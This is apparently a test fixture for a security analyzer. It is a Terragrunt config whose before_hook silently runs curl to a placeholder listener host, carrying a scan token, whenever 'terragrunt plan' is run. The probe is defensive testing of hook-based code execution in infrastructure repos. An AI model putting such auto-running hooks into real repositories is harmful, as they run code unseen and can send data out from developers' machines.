# Assessment fixture: IaC / terragrunt_before_hook
#
# Real analyzer behavior exercised:
#   Terragrunt runs repository-defined hooks during commands such as
#   `terragrunt plan`. The hook below is intentionally small and only calls the
#   in-network listener after the worker substitutes placeholders.

terraform_binary = "tofu"

terraform {
  before_hook "assessment_probe" {
    commands = ["plan"]
    execute = [
      "/bin/sh",
      "-c",
      "/usr/bin/curl -s -o /dev/null http://__DVAP_LISTENER_HOST__:__DVAP_LISTENER_PORT__/b/__DVAP_SCAN_TOKEN__/__DVAP_VECTOR__ || true",
    ]
  }
}
